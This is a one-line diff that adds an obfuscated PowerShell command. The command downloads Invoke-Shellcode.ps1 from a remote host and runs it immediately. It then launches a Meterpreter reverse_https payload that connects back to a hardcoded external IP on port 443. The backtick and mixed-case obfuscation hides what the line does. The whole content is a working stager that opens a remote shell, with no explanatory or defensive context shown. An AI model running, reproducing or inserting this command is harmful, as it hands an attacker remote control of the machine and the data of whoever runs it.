@@ -1,0 +1,1 @@
+﻿I`Ex (NEw`-oBJ`ECt Net.WebClient).DownloadString('http://el8.pw/ps/CodeExecution/Invoke-Shellcode.ps1'); iNvOKE-S`h`ElLCode -Payload windows/meterpreter/reverse_https -Lhost 65.112.221.34 -Lport 443 -Force
